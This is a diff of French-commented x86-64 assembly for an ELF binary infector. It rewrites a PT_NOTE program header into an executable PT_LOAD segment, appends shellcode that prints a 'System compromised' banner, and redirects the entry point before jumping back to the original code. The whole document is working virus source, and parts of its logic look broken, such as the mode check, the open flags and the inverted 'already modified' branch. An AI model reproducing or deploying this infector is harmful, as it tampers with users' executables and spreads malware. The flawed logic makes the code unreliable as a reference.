@@ -1,484 +1,403 @@
 section .data
-    magic_bytes db 0x7F, "ELF"    
-    err_msg db "Ce n'est pas un fichier ELF valide", 10
+    ; Définition des messages et constantes utilisés dans le programme
+    magic_bytes db 0x7F, "ELF"    ; Signature d'un fichier ELF    
+    err_msg db "Ce n'est pas un fichier ELF valide", 10 ; Message d'erreur pour fichier non ELF
     err_len equ $ - err_msg
-    dir_msg db "C'est un répertoire", 10
+    dir_msg db "C'est un répertoire", 10 ; Message pour indiquer que c'est un répertoire
     dir_len equ $ - dir_msg
-    elf_msg db "C'est un fichier ELF.", 10
+    elf_msg db "C'est un fichier ELF.", 10 ; Message pour indiquer que c'est un fichier ELF
     elf_len equ $ - elf_msg
     mod_msg db "Un segment PT_NOTE a été modifié en PT_LOAD avec les permissions RWE", 10
     mod_len equ $ - mod_msg
     already_mod_msg db "Ce fichier a déjà été modifié", 10
     already_mod_len equ $ - already_mod_msg
-    signature db "INFECTED", 0     
+    signature db "INFECTED", 0     ; Signature pour marquer les fichiers infectés    
     sig_len equ $ - signature
 
-    ; Messages de debug
-    debug_original_entry db "Adresse d'entrée originale: 0x", 0
-    debug_patch_addr db "Adresse du patch: 0x", 0
-    debug_vaddr db "Adresse virtuelle calculée: 0x", 0
-    debug_patch_value db "Valeur à patcher avec: 0x", 0
-    debug_new_entry db "Nouveau point d'entrée: 0x", 0
-    debug_newline db 10, 0
-
-    ; Buffer pour conversion hex
-    hex_buffer db "0000000000000000", 10, 0
-    hex_chars db "0123456789ABCDEF"
-
-    ; Shellcode position-independent
+    ; Section contenant le shellcode qui sera injecté dans le fichier cible
+    section .data.shellcode
+    align 16                 ; Aligner le shellcode sur une limite de 16 octets
     shellcode:
-        push rbp                   ; Sauvegarder le frame pointer
-        mov rbp, rsp              ; Créer un nouveau frame
+        call get_base ; Appel pour obtenir l'adresse de base
+    get_base:
+        pop rbx                        ; Récupère l'adresse de retour de la pile dans rbx
+        sub rbx, get_base - shellcode  ; Calcule l'adresse de base en soustrayant l'offset
         
-        pushf                     ; Sauvegarder les flags
-        push rax
-        push rbx
-        push rcx
+        ; Sauvegarder les registres essentiels
+        push rax 
+        push rcx 
         push rdx
         push rsi
         push rdi
-        push r8
-        push r9
-        push r10
-        push r11
-
-        ; Obtenir l'adresse du message de manière PIC
-        lea rsi, [rel msg]        ; Utiliser lea avec rel pour le PIC
-        jmp print_msg
-    msg:
-        db "Zonzi", 10
-    print_msg:
-        mov rax, 1              ; sys_write
-        mov rdi, 1              ; stdout
-        mov rdx, 6              ; longueur du message
+        
+        ; Afficher le message
+        mov rax, 1          ; sys_write
+        mov rdi, 1          ; stdout
+        lea rsi, [rbx + message - shellcode]  ; Charger l'adresse du message dans rsi
+        mov rdx, msg_len                      ; Charger la longueur du message dans rdx
         syscall
-
-        pop r11
-        pop r10
-        pop r9
-        pop r8
+        
+        ; Restaurer les registres
         pop rdi
         pop rsi
         pop rdx
         pop rcx
-        pop rbx
         pop rax
-        popf                    ; Restaurer les flags
         
-        leave                   ; Restaurer rbp et rsp
+        ; Calculer et sauter à l'adresse originale
+        mov rax, [rbx + entry_storage - shellcode]  ; Charger l'adresse d'entrée originale
+        mov rcx, [rbx + vaddr_storage - shellcode]  ; Charger l'adresse virtuelle du segment
+        sub rbx, rcx                                ; Calculer le décalage entre l'adresse de base et l'adresse virtuelle
+        add rax, rbx                                ; Ajouter le décalage à l'adresse d'entrée originale
+        jmp rax                                     ; Sauter à l'adresse d'entrée originale
 
-        ; Placer l'instruction jmp après le leave pour assurer une pile propre
-        db 0x48, 0xb8          ; movabs rax,
-        dq 0x0000000000000000  ; adresse à patcher
-        jmp rax
+        ; Données
+        message: db "[!] System compromised by H45H1F aka M364TR0N :)", 10
+        msg_len equ $ - message
+        
+        ; Stockage des adresses
+        entry_storage: dq 0
+        vaddr_storage: dq 0
 
     shellcode_end:
+
+    ; Offsets nécessaires
+    entry_offset equ entry_storage - shellcode
+    vaddr_offset equ vaddr_storage - shellcode
     shellcode_len equ shellcode_end - shellcode
-    
+
 section .bss
-    fd resq 1
+    fd resq 1                ; File descriptor pour le fichier cible
     filename resq 1          ; Pour stocker le nom du fichier
-    elf_header resb 64  
-    stat_buf resb 144       ; Buffer pour stocker les informations stat
+    elf_header resb 64       ; Buffer pour stocker l'en-tête ELF complet
+    stat_buf resb 144        ; Buffer pour stocker les informations stat
     phdr resb 56            ; Structure pour stocker un program header
-    note_data resb 1024     ; Buffer pour sauvegarder les données du segment NOTE
-    sig_buf resb 9
     original_entry_addr resq 1 ; Pour sauvegarder le point d'entrée original
+    magic resb 4             ; Pour stocker et vérifier la signature ELF (0x7F 'ELF')
+    phdr_offset resq 1       ; Offset de la table des program headers
+    phdr_entry_size resw 1   ; Taille d'une entrée dans la table des program headers
+    phdr_number resw 1       ; Nombre total de program headers
+    current_offset resq 1     ; Offset actuel lors du parcours du fichier
+    note_offset resq 1        ; Offset de la section NOTE si trouvée
+    note_found resb 1         ; Flag indiquant si une section NOTE a été trouvée (1) ou non (0)
 
 section .text
 global _start
 
-; Fonction pour convertir un nombre en hexadécimal
-hex_to_string:
-    push rbx
-    push rcx
-    push rdx
-    push rdi
-    
-    mov rcx, 16         ; 16 caractères à traiter
-    lea rdi, [hex_buffer]
-    
-.loop:
-    rol rax, 4          ; Rotation à gauche de 4 bits
-    mov rdx, rax        
-    and rdx, 0xf        ; Garder uniquement les 4 bits de poids faible
-    lea rbx, [hex_chars]
-    movzx rdx, byte [rbx + rdx]  ; Convertir en caractère hex
-    mov [rdi], dl
-    inc rdi
-    dec rcx
-    jnz .loop
-
-    pop rdi
-    pop rdx
-    pop rcx
-    pop rbx
-    ret
-
-; Fonction pour afficher une chaîne
-print_string:
-    push rax
-    push rdi
-    push rsi
-    push rdx
-    
-    mov rdi, 1          ; stdout
-    mov rax, 1          ; sys_write
-    syscall
-    
-    pop rdx
-    pop rsi
-    pop rdi
-    pop rax
-    ret
-
 _start:
-    ; Récupérer le premier argument (nom du fichier)
-    pop rdi                 ; Nombre d'arguments
-    pop rdi                 ; Nom du programme  
-    pop rdi                 ; Premier argument (nom du fichier)
-    mov [filename], rdi     ; Sauvegarder le nom du fichier
+    ; Vérifie le nombre d'arguments
+    mov rcx, [rsp]          ; Charge argc depuis la pile
+    dec rcx                 ; Soustrait 1 pour ignorer le nom du programme
+    test rcx, rcx           ; Vérifie si aucun argument
+    jz not_elf              ; Si pas d'arguments, erreur
+    
+    ; Récupère le nom du fichier
+    mov rdi, [rsp + 16]     ; Charge argv[1] directement depuis la pile
+    
+    push rdi                ; Sauvegarde le nom du fichier
     
     ; Appel système stat pour obtenir les informations du fichier
     mov rax, 4              ; sys_stat
-    mov rsi, stat_buf       
+    mov rsi, stat_buf       ; Adresse du buffer pour stocker les informations du fichier
     syscall
     test rax, rax           ; Vérifier si stat a réussi
     js exit                 ; Si erreur, sortir
-    
-    ; Vérifier si le fichier est un répertoire  
-    mov rax, qword [stat_buf + 24]  ; Charger st_mode
-    and rax, 0o170000       
-    cmp rax, 0o040000       
+
+    ; Vérifier si le fichier est un répertoire 
+    mov rax, [stat_buf + 16] ; Charger le mode du fichier depuis le buffer stat
+    cmp rax, 2              ; Comparer avec le mode répertoire
     je is_directory         ; Sauter si répertoire
 
     ; Ouvrir le fichier en lecture seule
-    mov rdi, [filename]     
     mov rax, 2              ; sys_open
-    mov rsi, 2              ; O_RDONLY 
-    syscall
-    cmp rax, 0          
-    jl exit
-    mov [fd], rax           ; Sauvegarder le descripteur
-    
-    ; Lire l'en-tête ELF  
-    mov rdi, rax
-    mov rax, 0              ; sys_read
-    mov rsi, elf_header     
-    mov rdx, 64
+    mov rsi, 2              ; O_RDONLY
     syscall
     
-    ; Vérifier les bytes magiques ELF
-    mov rsi, elf_header
-    mov rdi, magic_bytes
-    mov rcx, 4        
-    repe cmpsb
-    jne not_elf
-    
-    ; Afficher que c'est un fichier ELF
-    mov rax, 1              ; sys_write    
-    mov rdi, 1              ; stdout
-    mov rsi, elf_msg
-    mov rdx, elf_len  
-    syscall
+    ; Vérifie les erreurs d'ouverture
+    test rax, rax           ; Vérifier si l'ouverture a réussi
+    js not_elf              ; Si erreur, ce n'est pas un fichier ELF
 
-    ; Vérifier si le fichier a déjà été modifié
-    movzx rcx, word [elf_header + 56]  ; e_phnum
-    mov rbx, 0                          
+    ; Stocke le descripteur de fichier
+    mov [fd], rax           ; Stocker le descripteur de fichier dans fd
+
+    ; Restaure la pile et continue le traitement
+    add rsp, 144            ; Libère l'espace stat_buf
+
+    call verify_elf
+    call find_pt_note
 
 check_if_modified:
-    cmp rbx, rcx
-    jge scan_headers        ; Passer si tous les headers sont vérifiés
+    ; Vérifie s'il reste des segments à analyser
+    mov rcx, r12            ; Utilise rcx comme compteur
+    test rcx, rcx           ; Vérifie si le compteur est à zéro
+    jz exit                 ; Si zéro, sortir
 
-    ; Calculer l'offset du Program Header courant 
-    movzx rax, word [elf_header + 54]  ; e_phentsize
-    mul rbx
-    add rax, qword [elf_header + 32]   ; e_phoff  
-    
-    ; Lire le Program Header  
-    mov rdi, [fd]
-    mov rsi, rax                       
-    xor rdx, rdx                       
-    mov rax, 8              ; sys_lseek                         
+.check_loop:
+    ; Lecture du segment
+    push rcx                        ; Sauvegarde le compteur de boucle
+    mov rax, 8                      ; Prépare l'appel système lseek
+    mov rdi, [fd]                   ; Charge le descripteur de fichier
+    mov rsi, [current_offset]       ; Charge l'offset actuel
+    cdq                             ; Étend rdx en fonction du signe de rax
     syscall
     
-    mov rdi, [fd]
-    mov rax, 0              ; sys_read                         
-    mov rsi, phdr
-    mov rdx, 56                        
+    ; Lecture du program header
+    mov rax, 0                      ; Prépare l'appel système read
+    mov rsi, phdr                   ; Charge l'adresse du buffer pour le program header
+    movzx rdx, word [phdr_entry_size] ; Charge la taille d'une entrée de program header
     syscall
     
-    ; Lire la signature potentielle à la fin du segment
-    mov rdi, [fd]
-    mov rsi, qword [phdr + 8]
-    add rsi, qword [phdr + 32]
-    sub rsi, sig_len  
-    xor rdx, rdx
-    mov rax, 8              ; sys_lseek                        
-    syscall
+    ; Vérifie si le type de segment est PT_NOTE
+    cmp dword [phdr], 4             ; Compare le type de segment avec PT_NOTE
+    je .found_modified              ; Si égal, segment PT_NOTE trouvé
     
-    mov rdi, [fd]
-    mov rax, 0              ; sys_read                         
-    mov rsi, sig_buf
-    mov rdx, sig_len 
-    syscall
+    ; Passe au segment suivant
+    pop rcx                         ; Restaure le compteur de boucle
+    add [current_offset], rdx       ; Incrémente l'offset actuel par la taille de l'entrée
+    loop .check_loop                ; Décrémente rcx et boucle si rcx n'est pas zéro
     
-    ; Comparer la signature
-    mov rsi, sig_buf  
-    mov rdi, signature
-    mov rcx, sig_len
-    repe cmpsb
-    je file_already_modified    ; Sauter si déjà modifié
-    
-    inc rbx
-    jmp check_if_modified
+.found_modified:
+    pop rcx                 ; Restaure la pile
+    jmp file_already_modified ; Sauter à la routine de fichier déjà modifié
 
 scan_headers:
-    ; Rechercher un segment PT_NOTE à modifier
-    movzx rcx, word [elf_header + 56]  
-    mov rbx, 0                         
+    push rsi                    ; Sauvegarde le registre rsi
+    xchg rax, rsi               ; Échange les valeurs de rax et rsi
+    lea rsi, [elf_msg]          ; Charge l'adresse du message dans rsi
+    mov dl, elf_len             ; Charge la longueur du message dans dl
+    mov al, 1                   ; Prépare l'appel système write (syscall numéro 1)
+    syscall
+    jmp exit                    ; Sauter à la routine de sortie
 
 find_pt_note:
-    cmp rbx, rcx
-    jge exit
-
-    ; Calculer l'offset du Program Header
-    movzx rax, word [elf_header + 54]  
-    mul rbx
-    add rax, qword [elf_header + 32]   
+    push rdx                    ; Sauvegarde le registre rdx
+    xor edx, edx                ; Mettre edx à zéro
+    mov dx, [phdr_number]       ; Charger le nombre de program headers dans dx
+    mov r12, rdx                ; Stocker le nombre de program headers dans r12
     
-    ; Lire le Program Header
-    mov rdi, [fd]
-    mov rsi, rax                       
-    xor rdx, rdx                       
-    mov rax, 8              ; sys_lseek                         
-    syscall
+    mov rax, [phdr_offset]      ; Charger l'offset de la table des program headers dans rax
+    mov [current_offset], rax   ; Stocker l'offset actuel dans current_offset
     
-    mov rdi, [fd]
-    mov rax, 0              ; sys_read                         
-    mov rsi, phdr
-    mov rdx, 56                        
-    syscall
-    
-    ; Vérifier si c'est un PT_NOTE
-    mov eax, dword [phdr]
-    cmp eax, 4              ; PT_NOTE
-    je modify_header        ; Modifier si PT_NOTE
-    
-    inc rbx
-    jmp find_pt_note
+    and byte [note_found], 0    ; Réinitialiser le flag note_found à 0
+    pop rdx                     ; Restaure le registre rdx
+    ret
 
 modify_header:
-    ; Sauvegarder le point d'entrée original
-    mov rax, qword [elf_header + 24]  
-    mov [original_entry_addr], rax
-
-    ; DEBUG: Afficher l'adresse d'entrée originale
-    mov rsi, debug_original_entry
-    mov rdx, 23        
-    call print_string
-    
-    mov rax, [original_entry_addr]
-    call hex_to_string
-    mov rsi, hex_buffer
-    mov rdx, 17        
-    call print_string
-
-    ; Calculer une nouvelle adresse virtuelle basée sur un multiple de la page et configure le segment
-    mov dword [phdr], 1                ; PT_LOAD
-    mov dword [phdr + 4], 7            ; PF_R | PF_W | PF_X
-
-    ; Utiliser une adresse plus éloignée des bibliothèques dynamiques
-    mov rax, 0x8000000                 ; 128MB offset
-    mov qword [phdr + 16], rax         ; p_vaddr
-    mov qword [phdr + 24], rax         ; p_paddr
-
-    ; Calculer l'offset après tous les segments existants
-    mov rax, 0x4000                    ; Offset suffisamment grand
-    mov qword [phdr + 8], rax          ; p_offset
-
-    ; Configurer les tailles et l'alignement
-    mov qword [phdr + 32], shellcode_len  ; p_filesz
-    mov qword [phdr + 40], shellcode_len  ; p_memsz
-    mov qword [phdr + 48], 0x1000      ; p_align
-
-    ; Mise à jour du point d'entrée pour pointer vers notre nouveau segment
-    mov rax, qword [phdr + 16]         ; p_vaddr
-    mov qword [elf_header + 24], rax   ; e_entry = p_vaddr
-
-    ; DEBUG: Afficher l'adresse virtuelle calculée
-    push rax
-    mov rsi, debug_vaddr
-    mov rdx, 25        
-    call print_string
-    
-    mov rax, qword [phdr + 16]
-    call hex_to_string
-    mov rsi, hex_buffer
-    mov rdx, 17        
-    call print_string
-    pop rax
-
-    ; Copier le shellcode dans le buffer
-    mov rdi, note_data
-    mov rsi, shellcode
-    mov rcx, shellcode_len
-    rep movsb
-
-    ; Trouver l'instruction movabs dans le shellcode
-    mov rdi, note_data                 ; Base du shellcode
-    mov rcx, shellcode_len
-    sub rcx, 10                        ; Taille minimale pour l'instruction + adresse
-    
-find_movabs:
-    cmp byte [rdi], 0x48              ; Premier byte de movabs
-    je check_second_byte
-    inc rdi
-    loop find_movabs
-    jmp exit                          ; Si non trouvé, sortir
-    
-check_second_byte:
-    cmp byte [rdi + 1], 0xb8          ; Deuxième byte de movabs
-    je found_movabs
-    inc rdi
-    loop find_movabs
-    jmp exit
-    
-found_movabs:
-    add rdi, 2                        ; Pointer après movabs
-    
-    ; DEBUG: Afficher l'adresse du patch
-    push rdi
-    mov rsi, debug_patch_addr
-    mov rdx, 19
-    call print_string
-    
-    mov rax, rdi
-    call hex_to_string
-    mov rsi, hex_buffer
-    mov rdx, 17
-    call print_string
-
-    ; DEBUG: Afficher la valeur à patcher
-    mov rsi, debug_patch_value
-    mov rdx, 21
-    call print_string
-
-    mov rax, [original_entry_addr]    
-    call hex_to_string
-    mov rsi, hex_buffer
-    mov rdx, 17
-    call print_string
-
-    ; Effectuer le patch avec l'adresse corrigée pour PIE
-    pop rdi
-
-    ; Trouver la base PIE en utilisant le premier segment LOAD
-    mov rax, [phdr + 16]              ; Première adresse virtuelle du segment LOAD
-    mov rdx, [phdr + 8]               ; Premier offset du segment
-    sub rax, rdx                      ; Calculer la base PIE
-    add rax, [original_entry_addr]    ; Ajouter l'offset original
-    mov qword [rdi], rax              ; Patcher l'adresse
-
-    ; Écrire l'en-tête ELF modifié
-    mov rdi, [fd]
-    xor rsi, rsi                        ; Début du fichier
-    xor rdx, rdx
-    mov rax, 8                          ; sys_lseek
+    ; Lecture du header PT_NOTE
+    push rbx                ; Sauvegarde le registre rbx
+    mov eax, 8              ; Prépare l'appel système lseek
+    mov rdi, [fd]           ; Charge le descripteur de fichier
+    mov rsi, [note_offset]  ; Charge l'offset de la section NOTE
+    cdq                     ; Étend rdx en fonction du signe de rax
     syscall
     
-    mov rdi, [fd]
-    mov rax, 1                          ; sys_write
-    mov rsi, elf_header
-    mov rdx, 64                         ; Taille de l'en-tête ELF
-    syscall
-
-    ; Écrire le program header modifié
-    mov rdi, [fd]
-    movzx rax, word [elf_header + 54]   ; e_phentsize
-    mul rbx
-    add rax, qword [elf_header + 32]    ; e_phoff
-    mov rsi, rax                        ; Offset du program header
-    xor rdx, rdx
-    mov rax, 8                          ; sys_lseek
+    ; Lecture du program header
+    mov rdi, [fd]           ; Charge le descripteur de fichier
+    xor eax, eax            ; Prépare l'appel système read
+    lea rsi, [phdr]         ; Charge l'adresse du buffer pour le program header
+    movzx rdx, word [phdr_entry_size] ; Charge la taille d'une entrée de program header
     syscall
     
-    mov rdi, [fd]
-    mov rax, 1                          ; sys_write
-    mov rsi, phdr
-    mov rdx, 56                         ; Taille du program header
-    syscall
-
-    ; Écrire le shellcode
-    mov rdi, [fd]
-    mov rsi, qword [phdr + 8]           ; p_offset
-    xor rdx, rdx
-    mov rax, 8                          ; sys_lseek
+    ; Calcul nouvelle position et alignement
+    mov rdi, [fd]           ; Charge le descripteur de fichier
+    mov eax, 8              ; Prépare l'appel système lseek
+    xor esi, esi            ; Offset 0
+    mov dl, 2               ; SEEK_END
     syscall
     
-    mov rdi, [fd]
-    mov rax, 1                          ; sys_write
-    mov rsi, note_data
-    mov rdx, shellcode_len              ; Taille du shellcode
+    mov r14, rax            ; Stocke la position actuelle dans r14
+    add r14, 0xFFF          ; Ajoute 0xFFF pour l'alignement
+    and r14, -0x1000        ; Aligne l'adresse sur une limite de page (4096 octets)
+    
+    ; Configuration nouveau segment
+    mov dword [phdr], 1    ; PT_LOAD - Type de segment PT_LOAD
+    mov dword [phdr+4], 5  ; RWX - Permissions du segment (lecture, écriture, exécution)
+    mov [phdr+8], r14      ; Offset - Définir l'offset du segment à r14
+    lea rax, [r14+0x400000] ; Calculer l'adresse virtuelle du segment
+    mov [phdr+16], rax     ; vaddr - Définir l'adresse virtuelle du segment
+    mov [phdr+24], rax     ; paddr - Définir l'adresse physique du segment
+    mov eax, shellcode_len ; Charger la longueur du shellcode dans eax
+    mov [phdr+32], rax     ; filesz - Définir la taille du segment dans le fichier
+    mov [phdr+40], rax     ; memsz - Définir la taille du segment en mémoire
+    mov qword [phdr+48], 0x1000 ; Alignement du segment à 4096 octets
+    
+    mov rax, [phdr+16]     ; Charger l'adresse virtuelle du segment dans rax
+    mov [elf_header+24], rax ; Mettre à jour le point d'entrée dans l'en-tête ELF
+    
+    call write_modifications
+    call write_code
+    pop rbx                 ; Restaurer le registre rbx
+    ret
+
+write_modifications:
+    ; Positionnement au début du fichier
+    push rax                    ; Sauvegarde le registre rax
+    push rdi                    ; Sauvegarde le registre rdi
+    mov rax, 8                  ; Prépare l'appel système lseek
+    mov rdi, [fd]               ; Charge le descripteur de fichier
+    xor rsi, rsi                ; Offset 0 (début du fichier)
+    xor rdx, rdx                ; SEEK_SET (début du fichier)
+    syscall
+    pop rdi                     ; Restaure le registre rdi
+    pop rax                     ; Restaure le registre rax
+
+    ; Écriture du header ELF
+    push rcx                    ; Sauvegarde le registre rcx
+    mov rax, 1                  ; Prépare l'appel système write
+    mov rdi, [fd]               ; Charge le descripteur de fichier
+    lea rsi, [elf_header]       ; Charge l'adresse du header ELF
+    mov rdx, 64                 ; Taille du header ELF (64 octets)
+    syscall
+    pop rcx                     ; Restaure le registre rcx
+
+    ; Positionnement à l'offset de la note
+    push rbx                    ; Sauvegarde le registre rbx
+    mov rax, 8                  ; Prépare l'appel système lseek
+    mov rdi, [fd]               ; Charge le descripteur de fichier
+    mov rsi, [note_offset]      ; Charge l'offset de la section NOTE
+    xor rdx, rdx                ; SEEK_SET (début du fichier)
+    syscall
+    pop rbx                     ; Restaure le registre rbx
+
+    ; Écriture du program header
+    mov rax, 1                  ; Prépare l'appel système write
+    mov rdi, [fd]               ; Charge le descripteur de fichier
+    lea rsi, [phdr]             ; Charge l'adresse du program header
+    mov rdx, 56                 ; Taille du program header (56 octets)
     syscall
 
-    ; Ajouter la signature
-    mov rdi, [fd]
-    mov rsi, qword [phdr + 8]           ; p_offset
-    add rsi, shellcode_len              ; Ajouter après le shellcode
-    sub rsi, sig_len                    ; Reculer de la taille de la signature
-    xor rdx, rdx
-    mov rax, 8                          ; sys_lseek
+    ret  ; Retour de la fonction
+
+write_code:
+    ; Sauvegarde des registres importants
+    push rbx
+    push rcx
+
+    ; Mise à jour de l'adresse d'entrée dans le shellcode
+    mov rax, [original_entry_addr]       ; Charge l'adresse d'entrée originale dans rax
+    lea rdi, [shellcode + entry_offset]  ; Calcule l'adresse de stockage de l'entrée dans le shellcode
+    mov [rdi], rax                       ; Stocke l'adresse d'entrée originale dans le shellcode
+
+    ; Mise à jour de l'adresse virtuelle dans le shellcode
+    mov rax, [phdr + 16]                 ; Charge l'adresse virtuelle du segment dans rax
+    lea rdi, [shellcode + vaddr_offset]  ; Calcule l'adresse de stockage de l'adresse virtuelle dans le shellcode
+    mov [rdi], rax                       ; Stocke l'adresse virtuelle dans le shellcode
+
+    ; Positionnement dans le fichier
+    push rax                             ; Sauvegarde le registre rax
+    mov rax, 8                           ; Prépare l'appel système lseek
+    mov rdi, [fd]                        ; Charge le descripteur de fichier
+    mov rsi, r14                         ; Charge l'offset stocké dans r14
+    xor rdx, rdx                         ; SEEK_SET (début du fichier)
+    syscall
+    pop rax                              ; Restaure le registre rax
+
+    ; Écriture du shellcode
+    mov rax, 1                           ; Prépare l'appel système write
+    mov rdi, [fd]                        ; Charge le descripteur de fichier
+    lea rsi, [shellcode]                 ; Charge l'adresse du shellcode
+    mov rdx, shellcode_len               ; Charge la longueur du shellcode
+    syscall
+
+    ; Restauration des registres
+    pop rcx
+    pop rbx
+
+    ret
+
+verify_elf:
+    push rbx                            ; Sauvegarde des registres
+    sub rsp, 16                         ; Espace pour données temporaires
+    
+    ; Lecture des 4 premiers octets pour le magic number
+    sub rsp, 4                          ; Espace pour le magic number
+    mov rax, 0                          ; Prépare l'appel système read
+    mov rdi, [fd]                       ; Charge le descripteur de fichier
+    mov rsi, rsp                        ; Lire directement dans la stack
+    mov rdx, 4                          ; Lire 4 octets
     syscall
     
-    mov rdi, [fd]
-    mov rax, 1                          ; sys_write
-    mov rsi, signature
-    mov rdx, sig_len
-    syscall
-
-    ; Afficher le message de succès
-    mov rax, 1                          ; sys_write
+    ; Vérification du magic number
+    cmp dword [rsp], 0x464C457F         ; Comparer les 4 octets lus avec 0x464C457F (magic number ELF)
+    jne not_elf                         ; Si différent, ce n'est pas un fichier ELF
+    
+    ; Affichage message ELF
+    mov rax, 1                          ; Prépare l'appel système write
     mov rdi, 1                          ; stdout
-    mov rsi, mod_msg
-    mov rdx, mod_len
+    mov rsi, elf_msg                    ; Charger l'adresse du message ELF
+    mov rdx, elf_len                    ; Charger la longueur du message ELF
     syscall
     
-    jmp exit
+    ; Lecture du header complet
+    mov rax, 8                          ; Prépare l'appel système lseek
+    mov rdi, [fd]                       ; Charge le descripteur de fichier
+    xor rsi, rsi                        ; Offset 0 (début du fichier)
+    xor rdx, rdx                        ; SEEK_SET (début du fichier)
+    syscall
+    
+    ; Lecture du header ELF complet
+    mov rax, 0                          ; Prépare l'appel système read
+    mov rdi, [fd]                       ; Charge le descripteur de fichier
+    mov rsi, elf_header                 ; Charger l'adresse du buffer pour le header ELF
+    mov rdx, 64                         ; Lire 64 octets (taille du header ELF)
+    syscall
+    
+    ; Extraction des données du header
+    mov rax, [elf_header + 24]          ; Charger le point d'entrée du fichier ELF
+    mov [original_entry_addr], rax      ; Stocker le point d'entrée original
+    
+    mov rax, [elf_header + 32]          ; Charger l'offset de la table des program headers
+    mov [phdr_offset], rax              ; Stocker l'offset de la table des program headers
+    
+    mov ax, word [elf_header + 54]      ; Charger la taille d'une entrée de program header
+    mov [phdr_entry_size], ax           ; Stocker la taille d'une entrée de program header
+    
+    mov ax, word [elf_header + 56]      ; Charger le nombre de program headers
+    mov [phdr_number], ax               ; Stocker le nombre de program headers
+    
+    add rsp, 20                         ; Restaure la stack
+    pop rbx                             ; Restaure le registre rbx
+    ret
 
 file_already_modified:
-    ; Informer que le fichier est déjà modifié
-    mov rax, 1              ; sys_write
-    mov rdi, 1              ; stdout  
-    mov rsi, already_mod_msg
-    mov rdx, already_mod_len
-    syscall  
-    jmp exit
+    push rbx                        ; Sauvegarde registre
+    
+    ; Mise à jour des variables en utilisant un registre temporaire
+    mov rbx, [current_offset]       ; Charge l'offset actuel dans rbx
+    mov [note_offset], rbx          ; Stocke l'offset dans note_offset
+    
+    ; Marque le fichier comme déjà modifié
+    mov byte [note_found], 1        ; Met à jour le flag note_found à 1
+    
+    call modify_header              ; Appelle la fonction pour modifier le header
+    pop rbx                         ; Restaure le registre rbx
+    jmp exit                        ; Sauter à la routine de sortie
 
 is_directory:
     ; Informer que le chemin est un répertoire
-    mov rax, 1              ; sys_write
-    mov rdi, 1              ; stdout
-    mov rsi, dir_msg  
-    mov rdx, dir_len
+    mov rax, 1                      ; sys_write
+    mov rdi, 1                      ; stdout
+    mov rsi, dir_msg                ; Charger l'adresse du message de répertoire
+    mov rdx, dir_len                ; Charger la longueur du message de répertoire
     syscall
-    jmp exit
+    jmp exit                        ; Sauter à la routine de sortie
 
 not_elf:
     ; Informer que ce n'est pas un fichier ELF valide
-    mov rax, 1              ; sys_write  
-    mov rdi, 1              ; stdout
-    mov rsi, err_msg
-    mov rdx, err_len  
+    mov rax, 1              ; Prépare l'appel système write (écriture)
+    mov rdi, 1              ; stdout (sortie standard)
+    mov rsi, err_msg        ; Charger l'adresse du message d'erreur
+    mov rdx, err_len        ; Charger la longueur du message d'erreur
     syscall
-    jmp exit
+    jmp exit                ; Sauter à la routine de sortie
 
 exit:
-    ; Fermer le descripteur de fichier si ouvert  
-    mov rax, 3                            ; sys_close
+    ; Fermer le descripteur de fichier si ouvert
+    mov rdi, [fd]           ; Charger le descripteur de fichier
+    mov rax, 3              ; Prépare l'appel système close (fermeture)
     syscall
     
     ; Quitter le programme
-    mov rax, 60                           ; sys_exit  
-    xor rdi, rdi                          ; Code de retour 0
+    mov rax, 60             ; Prépare l'appel système exit (quitter)
+    xor rdi, rdi            ; Code de retour 0
     syscall
